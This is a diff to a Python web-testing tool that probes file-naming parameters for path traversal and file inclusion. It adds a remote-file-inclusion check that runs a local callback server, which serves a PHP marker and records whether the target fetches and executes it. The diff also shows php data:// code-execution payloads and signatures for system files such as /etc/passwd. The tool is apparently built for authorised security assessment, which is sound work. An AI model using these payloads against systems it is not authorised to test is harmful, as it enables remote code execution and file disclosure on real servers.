@@ -10,17 +10,27 @@ unchanged, and reports status, size, and a short body excerpt for each, flagging
 TRAVERSAL when a well-known file signature appears in the response (/etc/passwd,
 win.ini, /etc/hostname) or the answer changed in a file-like way.
 
-Safety: only the host of `--base` is contacted; GET only; redirects are not followed;
-when the HAR holds a logged-in storage state its cookies are used so parameters
-behind login are reached; TLS is not verified; WSTG_PAUSE (--pause) applies. Exit 4
-when no request got an answer.
+For remote file inclusion the tool runs a short-lived local HTTP server (the callback)
+and sends each parameter a URL pointing at it; if the target fetches that URL the
+parameter includes a remote file (or is an SSRF), and if the response shows the computed
+value the remote file ran. The callback address is auto-detected from the route to the
+target, or given with --callback; --no-callback skips it.
+
+Safety: only the host of `--base` is contacted directly; GET only; redirects are not
+followed; when the HAR holds a logged-in storage state its cookies are used so parameters
+behind login are reached; TLS is not verified; WSTG_PAUSE (--pause) applies. The callback
+server serves only a benign marker from the tester's own host and is closed at the end.
+Exit 4 when no request got an answer.
 """
 from __future__ import annotations
 
 import argparse
 import base64
+import http.server
 import re
+import socket
 import sys
+import threading
 import time
 from dataclasses import dataclass, field
 from pathlib import Path
@@ -62,6 +72,95 @@ EXEC_PAYLOADS = [
     ("php data:// wrapper (code execution)", f"data://text/plain;base64,{_PHP}"),
     ("php data:// wrapper, url-encoded", "data://text/plain;base64," + _PHP.replace("=", "%3d")),
 ]
+
+# Remote file inclusion: the tool runs a short-lived HTTP server (the "callback") that
+# the target can fetch a benign PHP marker from. If the target fetches it, the parameter
+# includes a remote file (or is an SSRF); if the response then shows EXEC_RESULT the
+# remote file ran. Only the tester's own host serves the file; nothing external is used.
+class Callback:
+    def __init__(self, host: str, port: int = 0):
+        self.hits: dict[str, str] = {}             # token -> client address that fetched it
+        self._lock = threading.Lock()
+        self.httpd = http.server.ThreadingHTTPServer(("0.0.0.0", port), self._handler())
+        self.port = self.httpd.server_address[1]
+        self.base = f"http://{host}:{self.port}"
+        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
+        self.thread.start()
+
+    def url(self, token: str) -> str:
+        return f"{self.base}/p{token}.txt"
+
+    def _handler(self):
+        cb = self
+        body = f"<?php echo {EXEC_SOURCE}; ?>".encode()
+
+        class H(http.server.BaseHTTPRequestHandler):
+            def do_GET(self):                       # noqa: N802
+                token = self.path[2:].split(".", 1)[0].split("?", 1)[0]
+                with cb._lock:
+                    cb.hits.setdefault(token, self.client_address[0])
+                self.send_response(200)
+                self.send_header("Content-Type", "text/plain")
+                self.send_header("Content-Length", str(len(body)))
+                self.end_headers()
+                self.wfile.write(body)
+
+            do_POST = do_GET                        # noqa: N815
+            do_HEAD = do_GET                        # noqa: N815
+
+            def log_message(self, *a):              # keep the probe output clean
+                pass
+        return H
+
+    def hit(self, token: str, wait: float = 0.0) -> str | None:
+        end = time.monotonic() + wait
+        while True:
+            with self._lock:
+                if token in self.hits:
+                    return self.hits[token]
+            if time.monotonic() >= end:
+                return None
+            time.sleep(0.05)
+
+    def close(self):
+        self.httpd.shutdown()
+        self.httpd.server_close()
+
+
+def detect_ip(host: str, port: int) -> str | None:
+    """The local address the OS would use to reach the target (so the target can reach
+    it back). None when there is no route (for example the target is only reachable
+    through a proxy); then a callback address must be given explicitly."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            s.connect((host, port))
+            return s.getsockname()[0]
+        finally:
+            s.close()
+    except OSError:
+        return None
+
+
+def start_callback(args, pr) -> tuple[Callback | None, str]:
+    """Start the callback server, or return (None, reason) when it is off or impossible."""
+    if args.no_callback:
+        return None, "remote file inclusion test off (--no-callback)"
+    if args.callback:
+        u = urlsplit(args.callback if "://" in args.callback else "http://" + args.callback)
+        host, port = u.hostname, (u.port or 0)
+        if not host:
+            return None, f"bad --callback {args.callback!r}"
+    else:
+        host, port = detect_ip(pr.host, pr.port), 0
+        if not host:
+            return None, (f"no callback address found (no route to {pr.host}); pass "
+                          "--callback http://YOUR-IP:PORT to test remote file inclusion")
+    try:
+        return Callback(host, port), ""
+    except OSError as e:
+        return None, f"could not start the callback server: {e}"
+
 
 # A response matching one of these almost certainly contains an out-of-scope file.
 SIGNATURES = [
@@ -180,49 +279,81 @@ def run(args) -> int:
     probe = listed + rest[: max(0, args.max - len(listed))]
     over = cands[len(probe):] if len(cands) > len(probe) else []
 
+    cb, cb_note = start_callback(args, pr)
     print(f"# traversal/inclusion probe of {pr.base}; GET only, redirects not followed, only {pr.host} contacted")
     print(f"# cookies: {'logged-in session ' + role if cookie else 'none (anonymous)'}")
     print(f"# {len(cands)} file-naming parameter(s); {len(probe)} probed, {len(over)} over the limit of {args.max}")
+    if cb:
+        print(f"# remote file inclusion: the target is asked to fetch a benign file from the callback at {cb.base}")
+    else:
+        print(f"# {cb_note}")
     for n in pr.notes:
         print(f"# {n}")
 
     sent = answered = 0
-    for c in probe:
-        print()
-        print(f"== {c.path}?{c.param}=   [sources: {', '.join(sorted(c.sources))}]")
-        base_ans = ep.fetch(c.url(pr.base, c.pairs[c.index][1]), cookie)
-        sent += 1
-        answered += base_ans.status is not None
-        print(f"   baseline ({c.param}={c.pairs[c.index][1] or '(empty)'}): {base_ans.short()}")
-        for label, payload in PAYLOADS:
-            if args.pause:
-                time.sleep(args.pause)
-            a = ep.fetch(c.url(pr.base, payload), cookie)
+    try:
+        for idx, c in enumerate(probe):
+            print()
+            print(f"== {c.path}?{c.param}=   [sources: {', '.join(sorted(c.sources))}]")
+            base_ans = ep.fetch(c.url(pr.base, c.pairs[c.index][1]), cookie)
             sent += 1
-            answered += a.status is not None
-            hit = signature(a.body) if a.status == 200 else None
-            flag = ""
-            if hit:
-                flag = f"   <= TRAVERSAL: response contains {hit}"
-            elif a.status == 200 and base_ans.status == 200 and abs(a.size - base_ans.size) > max(64, base_ans.size // 2):
-                flag = "   <= changed a lot from the baseline (check the excerpt)"
-            print(f"   {label}: {a.short()}{flag}")
-            if hit or flag:
-                print(f"       excerpt: {_excerpt(a.body)}")
-        for label, payload in EXEC_PAYLOADS:
-            if args.pause:
-                time.sleep(args.pause)
-            a = ep.fetch(c.url(pr.base, payload), cookie)
-            sent += 1
-            answered += a.status is not None
-            flag = ""
-            if a.status == 200 and EXEC_RESULT in a.body:
-                flag = "   <= CODE EXECUTION: the included wrapper ran (evaluated an expression)"
-            elif a.status == 200 and EXEC_SOURCE in a.body:
-                flag = "   <= included but shown as source, not executed"
-            print(f"   {label}: {a.short()}{flag}")
-            if flag:
-                print(f"       excerpt: {_excerpt(a.body)}")
+            answered += base_ans.status is not None
+            print(f"   baseline ({c.param}={c.pairs[c.index][1] or '(empty)'}): {base_ans.short()}")
+            for label, payload in PAYLOADS:
+                if args.pause:
+                    time.sleep(args.pause)
+                a = ep.fetch(c.url(pr.base, payload), cookie)
+                sent += 1
+                answered += a.status is not None
+                hit = signature(a.body) if a.status == 200 else None
+                flag = ""
+                if hit:
+                    flag = f"   <= TRAVERSAL: response contains {hit}"
+                elif a.status == 200 and base_ans.status == 200 and abs(a.size - base_ans.size) > max(64, base_ans.size // 2):
+                    flag = "   <= changed a lot from the baseline (check the excerpt)"
+                print(f"   {label}: {a.short()}{flag}")
+                if hit or flag:
+                    print(f"       excerpt: {_excerpt(a.body)}")
+            for label, payload in EXEC_PAYLOADS:
+                if args.pause:
+                    time.sleep(args.pause)
+                a = ep.fetch(c.url(pr.base, payload), cookie)
+                sent += 1
+                answered += a.status is not None
+                flag = ""
+                if a.status == 200 and EXEC_RESULT in a.body:
+                    flag = "   <= CODE EXECUTION: the included wrapper ran (evaluated an expression)"
+                elif a.status == 200 and EXEC_SOURCE in a.body:
+                    flag = "   <= included but shown as source, not executed"
+                print(f"   {label}: {a.short()}{flag}")
+                if flag:
+                    print(f"       excerpt: {_excerpt(a.body)}")
+            if cb:
+                if args.pause:
+                    time.sleep(args.pause)
+                url = cb.url(str(idx))
+                a = ep.fetch(c.url(pr.base, url), cookie)
+                sent += 1
+                answered += a.status is not None
+                client = cb.hit(str(idx), wait=2.0)
+                shown = a.status == 200 and EXEC_RESULT in a.body
+                src = a.status == 200 and EXEC_SOURCE in a.body
+                if client and shown:
+                    flag = f"   <= REMOTE CODE EXECUTION: the target fetched your file (from {client}) and ran it"
+                elif client and src:
+                    flag = f"   <= REMOTE FILE INCLUDED as source: fetched from {client}, not executed"
+                elif client:
+                    flag = f"   <= SSRF/RFI: the target fetched the callback (from {client}); output not reflected"
+                elif shown:
+                    flag = "   <= CODE EXECUTION but no callback hit (check the excerpt)"
+                else:
+                    flag = "   <= no callback received (remote include likely disabled, or the callback is unreachable)"
+                print(f"   remote file inclusion ({url}): {a.short()}{flag}")
+                if client or shown or src:
+                    print(f"       excerpt: {_excerpt(a.body)}")
+    finally:
+        if cb:
+            cb.close()
     if over:
         print()
         print(f"== not probed (over the limit of {args.max}; add them to the list to probe them)")
@@ -244,6 +375,9 @@ def main(argv: list[str] | None = None) -> int:
         ap.add_argument(f"--{opt}", help="evidence version folder (optional)")
     ap.add_argument("--max", type=int, default=MAX_PARAMS, help="file-naming parameters to probe")
     ap.add_argument("--pause", type=int, default=0)
+    ap.add_argument("--callback", help="base URL the target should fetch the remote-inclusion file from "
+                    "(http://IP[:PORT]); auto-detected from the route to the target when omitted")
+    ap.add_argument("--no-callback", action="store_true", help="skip the remote file inclusion test")
     return run(ap.parse_args(argv))
 
 
